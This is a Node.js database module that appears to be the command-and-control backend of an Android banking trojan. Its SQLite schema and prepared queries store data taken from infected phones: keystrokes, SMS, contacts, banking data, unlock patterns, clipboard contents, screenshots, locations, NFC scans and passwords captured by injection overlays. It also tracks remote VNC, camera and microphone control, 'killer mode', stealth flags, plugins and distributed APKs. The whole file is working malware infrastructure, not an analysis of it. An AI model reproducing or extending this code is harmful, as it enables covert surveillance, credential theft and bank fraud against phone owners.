'use strict';
const Database = require('better-sqlite3');
const path     = require('path');

const DB_FILE = process.env.DB_PATH || path.join(__dirname, 'oxy.db');
const db      = new Database(DB_FILE);
db.pragma('journal_mode = WAL');
db.pragma('synchronous  = NORMAL');
db.pragma('foreign_keys = ON');

db.exec(`
CREATE TABLE IF NOT EXISTS devices (
  device_id            TEXT PRIMARY KEY,
  model                TEXT DEFAULT '',
  manufacturer         TEXT DEFAULT '',
  android_version      TEXT DEFAULT '',
  sdk                  INTEGER DEFAULT 0,
  sim_operator         TEXT DEFAULT '',
  battery_level        INTEGER DEFAULT 0,
  is_charging          INTEGER DEFAULT 0,
  admin_active         INTEGER DEFAULT 0,
  accessibility_active INTEGER DEFAULT 0,
  network_type         TEXT DEFAULT '',
  ip_address           TEXT DEFAULT '',
  perm_accessibility   INTEGER DEFAULT 0,
  perm_overlay         INTEGER DEFAULT 0,
  perm_battery_opt     INTEGER DEFAULT 0,
  perm_camera          INTEGER DEFAULT 0,
  perm_contacts        INTEGER DEFAULT 0,
  perm_call_log        INTEGER DEFAULT 0,
  perm_microphone      INTEGER DEFAULT 0,
  perm_sms             INTEGER DEFAULT 0,
  perm_accounts        INTEGER DEFAULT 0,
  perm_storage         INTEGER DEFAULT 0,
  perm_location        INTEGER DEFAULT 0,
  perm_phone           INTEGER DEFAULT 0,
  is_online            INTEGER DEFAULT 0,
  last_seen            INTEGER DEFAULT 0,
  current_app          TEXT DEFAULT '',
  current_app_name     TEXT DEFAULT '',
  is_locked            INTEGER DEFAULT 0,
  is_screen_on         INTEGER DEFAULT 1,
  vnc_active           INTEGER DEFAULT 0,
  camera_active        INTEGER DEFAULT 0,
  mic_active           INTEGER DEFAULT 0,
  keylogger_active     INTEGER DEFAULT 0,
  screen_reader_active INTEGER DEFAULT 0,
  black_screen_active  INTEGER DEFAULT 0,
  killer_mode          INTEGER DEFAULT 0,
  banks_crypter        INTEGER DEFAULT 0,
  nfc_active           INTEGER DEFAULT 0,
  threat_level         INTEGER DEFAULT 0,
  inject_count         INTEGER DEFAULT 0,
  days_since_install   INTEGER DEFAULT 0,
  created_at           INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS keylogs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, raw TEXT, app_context TEXT DEFAULT '', ts INTEGER
);
CREATE INDEX IF NOT EXISTS idx_kl_dev ON keylogs(device_id, ts DESC);

CREATE TABLE IF NOT EXISTS sms (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, address TEXT, body TEXT, date INTEGER, type TEXT DEFAULT 'inbox'
);
CREATE INDEX IF NOT EXISTS idx_sms_dev ON sms(device_id);

CREATE TABLE IF NOT EXISTS contacts (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, name TEXT, number TEXT
);
CREATE INDEX IF NOT EXISTS idx_ct_dev ON contacts(device_id);

CREATE TABLE IF NOT EXISTS banking_data (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, bank TEXT, data_type TEXT, payload TEXT, ts INTEGER
);
CREATE INDEX IF NOT EXISTS idx_bd_dev ON banking_data(device_id, ts DESC);

CREATE TABLE IF NOT EXISTS unlock_sequences (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, utype TEXT, payload TEXT, ts INTEGER
);

CREATE TABLE IF NOT EXISTS clipboard_history (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, text TEXT, ts INTEGER
);

CREATE TABLE IF NOT EXISTS commands_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, action TEXT, params TEXT DEFAULT '{}',
  response TEXT DEFAULT '', sent INTEGER DEFAULT 1, ts INTEGER
);
CREATE INDEX IF NOT EXISTS idx_cl_dev ON commands_log(device_id, ts DESC);

CREATE TABLE IF NOT EXISTS installed_apps (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, package_name TEXT, app_name TEXT,
  is_system INTEGER DEFAULT 0, version TEXT DEFAULT '',
  is_bank INTEGER DEFAULT 0, inject_active INTEGER DEFAULT 0,
  keylog_count INTEGER DEFAULT 0,
  last_access TEXT DEFAULT 'Varredura recente',
  icon_b64 TEXT DEFAULT '', updated_at INTEGER,
  UNIQUE(device_id, package_name)
);
CREATE INDEX IF NOT EXISTS idx_app_dev ON installed_apps(device_id);

CREATE TABLE IF NOT EXISTS file_listings (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, path TEXT, files TEXT DEFAULT '[]', ts INTEGER,
  UNIQUE(device_id, path)
);

CREATE TABLE IF NOT EXISTS location_history (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, lat REAL, lng REAL, accuracy REAL DEFAULT 0,
  address TEXT DEFAULT '', ts INTEGER
);

CREATE TABLE IF NOT EXISTS screenshots (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, jpeg_b64 TEXT, ts INTEGER
);
CREATE INDEX IF NOT EXISTS idx_ss_dev ON screenshots(device_id, ts DESC);

CREATE TABLE IF NOT EXISTS plugins (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, plugin_id TEXT, class_name TEXT,
  sha256 TEXT DEFAULT '', status TEXT DEFAULT 'loaded', ts INTEGER,
  UNIQUE(device_id, plugin_id)
);

CREATE TABLE IF NOT EXISTS nfc_scans (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, uid TEXT, tech TEXT, protocol TEXT, raw TEXT DEFAULT '{}', ts INTEGER
);

CREATE TABLE IF NOT EXISTS financial_alerts (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, bank TEXT, alert TEXT, payload TEXT DEFAULT '{}', ts INTEGER
);

CREATE TABLE IF NOT EXISTS inject_passwords (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, package_name TEXT, app_name TEXT,
  password TEXT, extra TEXT DEFAULT '{}', ts INTEGER
);

CREATE TABLE IF NOT EXISTS fake_call_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT, caller_name TEXT, status TEXT, ts INTEGER
);

CREATE TABLE IF NOT EXISTS stored_apks (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name TEXT, url TEXT, size INTEGER DEFAULT 0, ts INTEGER
);
`);

// ── FIX BUG 1: cache setField prepared statements per column name ─────────────
const _setFieldCache = new Map();
function setField(field, deviceId, value) {
  if (!_setFieldCache.has(field)) {
    // Only allow whitelisted column names — prevents any SQL injection
    const ALLOWED = new Set([
      'vnc_active','camera_active','mic_active','keylogger_active',
      'screen_reader_active','black_screen_active','killer_mode',
      'banks_crypter','nfc_active','threat_level','inject_count',
      'is_online','last_seen','battery_level','is_charging',
      'admin_active','accessibility_active','stealth_mode',
      'days_since_install',
    ]);
    if (!ALLOWED.has(field)) throw new Error(`setField: disallowed column "${field}"`);
    _setFieldCache.set(field, db.prepare(`UPDATE devices SET ${field}=? WHERE device_id=?`));
  }
  return _setFieldCache.get(field).run(value, deviceId);
}

const q = {
  // ── Devices ──────────────────────────────────────────────────────────────────
  upsertDevice: db.prepare(`
    INSERT INTO devices (
      device_id, model, manufacturer, android_version, sdk, sim_operator,
      battery_level, is_charging, admin_active, accessibility_active, network_type, ip_address,
      perm_accessibility, perm_overlay, perm_battery_opt, perm_camera, perm_contacts,
      perm_call_log, perm_microphone, perm_sms, perm_accounts, perm_storage,
      perm_location, perm_phone, is_online, last_seen, created_at
    ) VALUES (
      @device_id, @model, @manufacturer, @android_version, @sdk, @sim_operator,
      @battery_level, @is_charging, @admin_active, @accessibility_active, @network_type, @ip_address,
      @perm_accessibility, @perm_overlay, @perm_battery_opt, @perm_camera, @perm_contacts,
      @perm_call_log, @perm_microphone, @perm_sms, @perm_accounts, @perm_storage,
      @perm_location, @perm_phone, 1, @last_seen, @last_seen
    )
    ON CONFLICT(device_id) DO UPDATE SET
      model=excluded.model, manufacturer=excluded.manufacturer,
      android_version=excluded.android_version, sdk=excluded.sdk,
      sim_operator=excluded.sim_operator, battery_level=excluded.battery_level,
      is_charging=excluded.is_charging, admin_active=excluded.admin_active,
      accessibility_active=excluded.accessibility_active, network_type=excluded.network_type,
      ip_address=excluded.ip_address,
      perm_accessibility=excluded.perm_accessibility, perm_overlay=excluded.perm_overlay,
      perm_battery_opt=excluded.perm_battery_opt, perm_camera=excluded.perm_camera,
      perm_contacts=excluded.perm_contacts, perm_call_log=excluded.perm_call_log,
      perm_microphone=excluded.perm_microphone, perm_sms=excluded.perm_sms,
      perm_accounts=excluded.perm_accounts, perm_storage=excluded.perm_storage,
      perm_location=excluded.perm_location, perm_phone=excluded.perm_phone,
      is_online=1, last_seen=excluded.last_seen
  `),

  setOnline:  db.prepare(`UPDATE devices SET is_online=1, last_seen=? WHERE device_id=?`),
  setOffline: db.prepare(`UPDATE devices SET is_online=0, last_seen=? WHERE device_id=?`),
  touchSeen:  db.prepare(`UPDATE devices SET last_seen=? WHERE device_id=?`),

  updateStatus: db.prepare(`
    UPDATE devices SET current_app=@pkg, current_app_name=@name,
      is_locked=@locked, is_screen_on=@screenOn, last_seen=@ts
    WHERE device_id=@id
  `),
  updateBattery: db.prepare(`UPDATE devices SET battery_level=@bl, is_charging=@ch WHERE device_id=@id`),

  getAll:   db.prepare(`SELECT * FROM devices ORDER BY is_online DESC, last_seen DESC`),
  getOne:   db.prepare(`SELECT * FROM devices WHERE device_id=?`),
  getStats: db.prepare(`
    SELECT
      (SELECT COUNT(*) FROM devices)                    AS total_devices,
      (SELECT COUNT(*) FROM devices WHERE is_online=1)  AS online_devices,
      (SELECT COUNT(*) FROM stored_apks)                AS stored_apks,
      (SELECT COUNT(*) FROM keylogs)                    AS total_keylogs,
      (SELECT COUNT(*) FROM banking_data)               AS total_banking,
      (SELECT COUNT(*) FROM unlock_sequences)           AS total_unlocks,
      (SELECT COUNT(*) FROM inject_passwords)           AS total_injects
  `),

  // ── Keylogs ──────────────────────────────────────────────────────────────────
  insertKeylog: db.prepare(`INSERT INTO keylogs (device_id,raw,app_context,ts) VALUES (?,?,?,?)`),
  getKeylogs:   db.prepare(`SELECT * FROM keylogs WHERE device_id=? ORDER BY ts DESC LIMIT ? OFFSET ?`),

  // ── SMS ──────────────────────────────────────────────────────────────────────
  clearSms:  db.prepare(`DELETE FROM sms WHERE device_id=?`),
  insertSms: db.prepare(`INSERT INTO sms (device_id,address,body,date,type) VALUES (?,?,?,?,?)`),
  getSms:    db.prepare(`SELECT * FROM sms WHERE device_id=? ORDER BY date DESC LIMIT 200`),

  // ── Contacts ─────────────────────────────────────────────────────────────────
  clearContacts:  db.prepare(`DELETE FROM contacts WHERE device_id=?`),
  insertContact:  db.prepare(`INSERT INTO contacts (device_id,name,number) VALUES (?,?,?)`),
  getContacts:    db.prepare(`SELECT * FROM contacts WHERE device_id=? ORDER BY name ASC`),

  // ── Banking ──────────────────────────────────────────────────────────────────
  insertBanking: db.prepare(`INSERT INTO banking_data (device_id,bank,data_type,payload,ts) VALUES (?,?,?,?,?)`),
  getBanking:    db.prepare(`SELECT * FROM banking_data WHERE device_id=? ORDER BY ts DESC LIMIT 200`),

  // ── Unlocks ──────────────────────────────────────────────────────────────────
  insertUnlock: db.prepare(`INSERT INTO unlock_sequences (device_id,utype,payload,ts) VALUES (?,?,?,?)`),
  getUnlocks:   db.prepare(`SELECT * FROM unlock_sequences WHERE device_id=? ORDER BY ts DESC`),

  // ── Clipboard ────────────────────────────────────────────────────────────────
  insertClipboard: db.prepare(`INSERT INTO clipboard_history (device_id,text,ts) VALUES (?,?,?)`),
  getClipboard:    db.prepare(`SELECT * FROM clipboard_history WHERE device_id=? ORDER BY ts DESC LIMIT 100`),

  // ── Commands ─────────────────────────────────────────────────────────────────
  insertCmd: db.prepare(`INSERT INTO commands_log (device_id,action,params,sent,ts) VALUES (?,?,?,?,?)`),
  getCmds:   db.prepare(`SELECT * FROM commands_log WHERE device_id=? ORDER BY ts DESC LIMIT ? OFFSET ?`),

  // ── Apps ─────────────────────────────────────────────────────────────────────
  upsertApp: db.prepare(`
    INSERT INTO installed_apps
      (device_id,package_name,app_name,is_system,version,is_bank,inject_active,keylog_count,icon_b64,updated_at)
    VALUES (@did,@pkg,@name,@sys,@ver,@bank,@inj,@klc,@icon,@ts)
    ON CONFLICT(device_id,package_name) DO UPDATE SET
      app_name=excluded.app_name, is_system=excluded.is_system, version=excluded.version,
      is_bank=excluded.is_bank, icon_b64=COALESCE(NULLIF(excluded.icon_b64,''),icon_b64),
      updated_at=excluded.updated_at
  `),
  setInject: db.prepare(`UPDATE installed_apps SET inject_active=? WHERE device_id=? AND package_name=?`),
  incKeylog: db.prepare(`UPDATE installed_apps SET keylog_count=keylog_count+1 WHERE device_id=? AND package_name=?`),
  getApps:   db.prepare(`SELECT * FROM installed_apps WHERE device_id=? ORDER BY is_bank DESC, inject_active DESC, app_name ASC`),
  deleteApp: db.prepare(`DELETE FROM installed_apps WHERE device_id=? AND package_name=?`),

  // ── Files — FIX BUG 8: UNIQUE(device_id,path) → INSERT OR REPLACE ────────────
  upsertFiles: db.prepare(`
    INSERT OR REPLACE INTO file_listings (device_id,path,files,ts) VALUES (?,?,?,?)
  `),
  getFiles: db.prepare(`SELECT * FROM file_listings WHERE device_id=? AND path=? ORDER BY ts DESC LIMIT 1`),

  // ── Location ─────────────────────────────────────────────────────────────────
  insertLoc: db.prepare(`INSERT INTO location_history (device_id,lat,lng,accuracy,address,ts) VALUES (?,?,?,?,?,?)`),
  getLocs:   db.prepare(`SELECT * FROM location_history WHERE device_id=? ORDER BY ts DESC LIMIT 50`),

  // ── Screenshots ──────────────────────────────────────────────────────────────
  insertSS:  db.prepare(`INSERT INTO screenshots (device_id,jpeg_b64,ts) VALUES (?,?,?)`),
  pruneSS:   db.prepare(`DELETE FROM screenshots WHERE id IN (SELECT id FROM screenshots WHERE device_id=? ORDER BY ts ASC LIMIT -1 OFFSET 30)`),
  getSS:     db.prepare(`SELECT id, ts FROM screenshots WHERE device_id=? ORDER BY ts DESC LIMIT 20`),
  getSSById: db.prepare(`SELECT jpeg_b64 FROM screenshots WHERE id=?`),

  // ── Plugins ──────────────────────────────────────────────────────────────────
  upsertPlugin: db.prepare(`
    INSERT INTO plugins (device_id,plugin_id,class_name,sha256,status,ts)
    VALUES (@did,@pid,@cls,@sha,@status,@ts)
    ON CONFLICT(device_id,plugin_id) DO UPDATE SET
      class_name=excluded.class_name, sha256=excluded.sha256, status=excluded.status, ts=excluded.ts
  `),
  getPlugins: db.prepare(`SELECT * FROM plugins WHERE device_id=? ORDER BY ts DESC`),

  // ── NFC ──────────────────────────────────────────────────────────────────────
  insertNfc:  db.prepare(`INSERT INTO nfc_scans (device_id,uid,tech,protocol,raw,ts) VALUES (?,?,?,?,?,?)`),
  getNfcLast: db.prepare(`SELECT * FROM nfc_scans WHERE device_id=? ORDER BY ts DESC LIMIT 1`),
  getNfcAll:  db.prepare(`SELECT * FROM nfc_scans WHERE device_id=? ORDER BY ts DESC LIMIT 50`),

  // ── Financial ────────────────────────────────────────────────────────────────
  insertFin:      db.prepare(`INSERT INTO financial_alerts (device_id,bank,alert,payload,ts) VALUES (?,?,?,?,?)`),
  getFinAlerts:   db.prepare(`SELECT * FROM financial_alerts WHERE device_id=? ORDER BY ts DESC LIMIT 50`),
  getAllFinAlerts: db.prepare(`SELECT * FROM financial_alerts ORDER BY ts DESC LIMIT 50`),

  // ── Inject passwords ─────────────────────────────────────────────────────────
  insertInjectPw: db.prepare(`INSERT INTO inject_passwords (device_id,package_name,app_name,password,extra,ts) VALUES (?,?,?,?,?,?)`),
  getInjectPws:   db.prepare(`SELECT * FROM inject_passwords WHERE device_id=? ORDER BY ts DESC LIMIT 100`),

  // ── Fake call log ────────────────────────────────────────────────────────────
  insertFakeCall: db.prepare(`INSERT INTO fake_call_log (device_id,caller_name,status,ts) VALUES (?,?,?,?)`),
  getFakeCalls:   db.prepare(`SELECT * FROM fake_call_log WHERE device_id=? ORDER BY ts DESC LIMIT 50`),

  // ── APKs ─────────────────────────────────────────────────────────────────────
  getApks:   db.prepare(`SELECT * FROM stored_apks ORDER BY ts DESC`),
  insertApk: db.prepare(`INSERT INTO stored_apks (name,url,size,ts) VALUES (?,?,?,?)`),
};

module.exports = { db, q, setField };
